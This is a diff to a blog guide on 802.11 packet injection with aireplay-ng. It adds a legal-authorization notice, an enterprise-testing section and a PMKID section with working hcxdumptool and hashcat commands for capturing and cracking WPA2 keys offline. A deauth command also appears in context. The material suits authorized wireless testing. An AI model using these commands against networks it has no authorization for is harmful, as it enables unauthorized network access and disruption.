@@ -8,6 +8,10 @@ showTableOfContents: true
 tags: ["packet-injection", "aireplay-ng", "kali-linux", "wifi-adapter", "RTL8812AU", "ALFA-Network"]
 ---
 
+{{< alert "triangle-exclamation" >}}
+**Legal Notice:** Packet injection and wireless monitoring must only be performed on networks you own or have explicit written authorization to test. Unauthorized interception of wireless communications is illegal in most jurisdictions. All examples in this guide are for use in **authorized penetration testing and educational lab environments only**.
+{{< /alert >}}
+
 ## What Is Packet Injection?
 
 Packet injection — formally known as **802.11 frame injection** — is the ability of a wireless adapter to transmit arbitrary 802.11 frames onto a wireless medium, including frames that do not originate from the adapter's own network stack. In normal operation, a wireless driver constructs and transmits only the frames that the OS has legitimately generated: association requests, data frames for connected networks, and so on. Packet injection bypasses these restrictions, allowing a tool like `aireplay-ng` to craft and send any frame type — management, control, or data — with arbitrary content, source addresses, and destination addresses.
@@ -199,9 +203,40 @@ sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
 
 Switch back to Terminal 1 and watch for the `WPA handshake: AA:BB:CC:DD:EE:FF` message in the top-right corner of airodump-ng.
 
+### PMKID Attack — No Deauthentication Required
+
+Since 2018, the PMKID attack method allows capturing enough data for offline WPA2 key testing **without sending any deauth frames** — making it significantly stealthier and more effective against networks with few or no connected clients:
+
+```bash
+# Install tools
+sudo apt install hcxdumptool hcxtools
+
+# Capture PMKID (passive, no deauth)
+sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
+
+# Convert for hashcat
+hcxpcapngtool -o hash.hc22000 capture.pcapng
+
+# Crack offline (does not require active network connection)
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+```
+
 ### Deauthentication Testing (DoS Assessment)
 
 Security assessors test wireless resilience by sending deauth floods to evaluate whether clients re-associate securely and whether the AP logs or mitigates the attack. Always performed under a signed statement of work.
+
+---
+
+## What This Means for Enterprise Security Teams
+
+Packet injection testing is a standard component of wireless penetration testing engagements. Key use cases for enterprise IT:
+
+- **Rogue AP detection:** Verify whether unauthorized APs are broadcasting on corporate frequencies
+- **WPA2 handshake capture audits:** Assess password strength policy compliance
+- **PMF (Protected Management Frames) verification:** Confirm that 802.11w is enforced on all enterprise APs — if deauth attacks succeed, PMF is not enabled
+- **Client isolation testing:** Ensure client-to-client traffic is blocked on guest networks
+
+For a full enterprise wireless security assessment framework, see [Enterprise Wireless Security Assessment](/en/blog/enterprise-wireless-security-assessment/).
 
 ---
 
